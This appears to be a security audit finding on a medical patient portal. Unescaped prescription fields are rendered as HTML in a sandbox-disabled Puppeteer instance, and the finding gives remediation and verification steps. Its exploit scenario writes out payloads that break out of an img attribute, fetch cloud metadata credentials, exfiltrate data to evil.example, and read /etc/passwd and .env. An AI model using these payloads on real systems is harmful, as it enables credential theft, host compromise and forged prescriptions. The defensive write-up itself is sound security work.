# SEC-015 — Unescaped HTML injection into a sandbox-disabled Puppeteer renderer

| Field | Value |
|---|---|
| Severity | **High** |
| CVSS v3.1 | 8.6 (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L`) |
| OWASP Top 10 2021 | A03:2021 – Injection; A10:2021 – Server-Side Request Forgery |
| OWASP ASVS 4.0.3 | V5.3.3 – Context-aware output encoding; V5.2.5 – Template injection protection; V12.6.1 – SSRF protection; V14.1.4 – Components run with least privilege |
| CWE | CWE-79 – Cross-site Scripting; CWE-918 – Server-Side Request Forgery; CWE-1188 – Insecure Default Initialization |
| Status | Open |
| Affected component | `helpers/generatePrescription.js`, `helpers/generatePdf.js`, `routes/prescriptionRoutes.js` |

## Summary

Prescription PDFs are produced by interpolating stored prescription values into an HTML template with **no escaping**, then rendering that HTML in Puppeteer launched with `--no-sandbox --disable-setuid-sandbox`.

Twelve interpolation points are attacker-influenced, including full control of an `<img src>` attribute. The data reaches them through `POST /api/prescription/detail`, which carries **no authentication** ([SEC-008](SEC-008-unauthenticated-sensitive-routes.md)) and no schema validation.

Three distinct consequences: server-side HTML/JavaScript execution inside a Chrome instance whose sandbox is switched off; blind SSRF against internal network resources; and persistent script content in a PDF that is written to a public URL and emailed to the patient.

## Affected code

`helpers/generatePrescription.js` — every interpolation is raw:

| Line | Interpolation |
|---|---|
| 126 | `<strong>Name:</strong> ${details.patient.name}` |
| 157 | `Chief Complaints: </span> ${details.chiefComplaints}` |
| 162 | `Diagnosis: </span> ${details.diagnosis}` |
| 167 | `${details.previousHistory}` |
| 172 | `${details.labFindings}` |
| 177 | `${details.suggestedInvestigations}` |
| 182 | `${details.specialInstructions}` |
| 204–207 | `${medicine.medicineName}`, frequency, duration, strength, drugForm, instructions |
| 216 | `<img src="${details.signature}" alt="signature" ...>` |

Line 216 is the most dangerous — the value lands inside an attribute that the renderer will **fetch**:

```html
<img src="${details.signature}" alt="signature" style="max-width: 100%; height: auto;">
```

`helpers/generatePdf.js:17-25` — the renderer configuration:

```js
const browser = await puppeteer.launch({
    executablePath: '/usr/bin/google-chrome',
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox']      // :20  sandbox disabled
});
const page = await browser.newPage();
await page.setContent(htmlContent);                          // :25  attacker-controlled markup
```

`helpers/generatePdf.js:34` — a second injection point, into the PDF footer template:

```js
footerTemplate: `<div style="...">${footerContent}</div>`,
```

Entry point — `routes/prescriptionRoutes.js:7`, with no `jwtAuth` and no `validateSchema`:

```js
router.post('/prescription/detail', validateDataEncryption(), PatientController.savePrescriptionDetails);
```

The flow is `controllers/patientController.js:245-260` → `PatientService.savePrescriptionDetail(...)` → `generatePrescription(data)`. Values are persisted first (`services/patientService.js:616,620`, mass-assigned per [SEC-013](SEC-013-mass-assignment.md)) and rendered second, so this is a **stored** injection: the payload is re-rendered on every subsequent PDF generation.

Output handling — `helpers/generatePrescription.js:242` writes the PDF to a public URL under `assets/prescriptions/`, and `:257` emails it to the patient.

## Technical detail

**`--no-sandbox` is the aggravating factor.** Chrome's sandbox is the boundary that contains a compromised renderer. With `--no-sandbox`, a renderer running attacker-supplied content executes with the **full privileges of the Node process** — which, on this deployment, is also the process that can read `.env` and write to `assets/`. Any Chrome renderer vulnerability, of which several are found each year, escalates directly to host compromise. Puppeteer's own documentation states the flag should only be used with content you fully trust.

The flag is typically added to work around running as root in a container. The correct remedy is to run as a non-root user with the sandbox enabled, not to disable the sandbox.

**SSRF via `<img src>`.** `page.setContent` renders and Chrome fetches subresources. `details.signature` is inserted directly into `src`, so an attacker sets it to an internal URL:

- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — cloud instance metadata
- `http://localhost:3306/`, `http://10.0.0.5:6379/` — internal service probing
- `file:///etc/passwd`, `file:///var/www/patientportalapi/.env` — local file read

The requests originate from the server, inside the trust boundary. Even without seeing responses directly, the attacker can exfiltrate: inject `<script>fetch('/etc/...').then(r=>r.text()).then(t=>new Image().src='https://evil.example/?'+btoa(t))</script>` into any of the twelve fields — script executes during rendering, and the outbound request carries the data.

**Persistent XSS in the delivered PDF.** The rendered PDF is written to `https://patientportalapi.akosmd.in/assets/prescriptions/...` and emailed. PDF readers execute embedded JavaScript in some configurations, and a browser-rendered PDF from the clinic's own domain carries high trust. Content injected into a *prescription* — dosage, medication name, instructions — is also a direct patient-safety concern independent of any code execution.

**No authentication on the write path.** Anyone can create a prescription record containing these payloads, attribute it to any patient, and cause it to be generated and emailed.

## Exploit scenario

**Cloud credential theft via SSRF**

1. Attacker calls the unauthenticated `POST /api/prescription/detail` (payload encryption is not an obstacle — see [SEC-005](SEC-005-public-crypto-oracle-endpoints.md)):
   ```json
   {
     "patientId": 1, "doctorId": 1,
     "signature": "x\" onerror=\"fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(t=>fetch('https://evil.example/?d='+encodeURIComponent(t)))",
     "diagnosis": "routine"
   }
   ```
2. The value is stored, then interpolated into the `<img src>` attribute. The quote breaks out of the attribute and `onerror` becomes an event handler.
3. Puppeteer renders the page. The handler fires, the server fetches its own instance metadata, and the credentials are sent to the attacker's host.
4. Attacker now holds cloud credentials for the infrastructure hosting PHI.

**Local file read**

5. `"signature": "file:///var/www/patientportalapi/.env"` embeds the file in the rendered output, or is exfiltrated via a script payload. This yields `JWT_SECRET` and every third-party key ([SEC-032](SEC-032-secret-sprawl-working-tree.md)).

**Renderer escape**

6. With the sandbox disabled, any Chrome renderer exploit delivered through the same injection executes as the application user — full host compromise.

**Clinical falsification**

7. `"medicineName": "Warfarin 10mg"` with altered dosage instructions produces a legitimate-looking prescription PDF, from the clinic's domain, emailed to the patient.

## Impact

- **Confidentiality:** SSRF to cloud metadata and internal services; local file read including secrets.
- **Integrity:** forged prescriptions delivered to patients with clinical content chosen by the attacker.
- **Availability:** each request spawns a Chrome process — unauthenticated, this is a cheap resource-exhaustion vector.
- **Scope:** changed — the rendering component reaches resources beyond the vulnerable application.
- **Patient safety:** falsified medication and dosage in a document patients act on.

## Remediation

**Step 1 — escape every interpolation.** Use a template engine with automatic contextual escaping (Handlebars, Nunjucks, EJS with `<%= %>`), or escape explicitly:

```js
const escapeHtml = (v) => String(v ?? '')
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');

// Every text interpolation:
<strong>Name:</strong> ${escapeHtml(details.patient.name)}
```

HTML-escaping is **not sufficient for the `src` attribute** — `javascript:` and `data:` URLs survive it. Validate the signature separately:

```js
function safeSignatureSrc(value) {
    const s = String(value ?? '');
    // Accept only an inline PNG/JPEG data URI produced by our own upload pipeline.
    if (/^data:image\/(png|jpeg);base64,[A-Za-z0-9+/=]+$/.test(s)) return s;
    // Or a path within our own asset store, resolved server-side to a local file.
    if (/^[a-f0-9]{32}\.(png|jpg)$/.test(s)) return toLocalSignaturePath(s);
    return '';    // fail closed — render no signature rather than an attacker's URL
}
```

**Step 2 — re-enable the Chrome sandbox.** Remove `--no-sandbox` and `--disable-setuid-sandbox`, and run the container as a non-root user:

```js
const browser = await puppeteer.launch({
    headless: 'new',
    args: ['--disable-dev-shm-usage'],         // container-friendly, and keeps the sandbox on
});
```

```dockerfile
RUN groupadd -r pptruser && useradd -r -g pptruser -G audio,video pptruser
USER pptruser
```

If the sandbox genuinely cannot be enabled, isolate rendering in a dedicated container with no network access, no secrets mounted, and a read-only filesystem.

**Step 3 — block subresource fetching during render.** The template needs no external resources:

```js
const page = await browser.newPage();
await page.setJavaScriptEnabled(false);              // the template contains no legitimate script
await page.setRequestInterception(true);
page.on('request', (req) => {
    if (req.isNavigationRequest() && req.frame() === page.mainFrame()) return req.continue();
    return req.abort();                              // no images, no scripts, no stylesheets, no fetch
});
await page.setContent(htmlContent, { waitUntil: 'domcontentloaded' });
await page.close();
```

Embed the signature as an inline `data:` URI resolved server-side, so no network fetch is needed at all. Disabling JavaScript alone closes the script-execution path; request interception closes the SSRF path. Apply both.

**Step 4 — authenticate and validate the entry point.** Add `requireAuth(ROLES.CARE_NAVIGATOR)` (or the appropriate clinician role) to `routes/prescriptionRoutes.js:7`, plus a Joi schema constraining each field's type and length. A patient must not be able to author their own prescription at all.

**Step 5 — bound resource use.** A render queue with concurrency limits, a per-render timeout, and a single reused browser instance rather than a fresh launch per request.

**Step 6 — escape `footerContent`** at `generatePdf.js:34` with the same helper.

## Verification

1. **Escaping:** submit `<script>alert(1)</script>` in `diagnosis`. The generated PDF must show the literal text, not execute it.
2. **Attribute breakout:** submit `x" onerror="fetch('https://canary.example')` as `signature`. No request may reach the canary host.
3. **SSRF:** submit `http://169.254.169.254/latest/meta-data/` as `signature`. Confirm via network monitoring that the server makes no such request.
4. **File scheme:** submit `file:///etc/passwd`. Must render nothing.
5. **Sandbox:** `grep -n "no-sandbox" helpers/generatePdf.js` returns nothing; confirm the process does not run as root.
6. **Auth:** unauthenticated `POST /api/prescription/detail` returns 401.
7. **Interception:** instrument the request handler and confirm every subresource request is aborted during a normal render.

## References

- OWASP — [Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- OWASP — [Server Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- Puppeteer — [Running without a sandbox](https://pptr.dev/troubleshooting#setting-up-chrome-linux-sandbox)
- CWE-918 — [Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
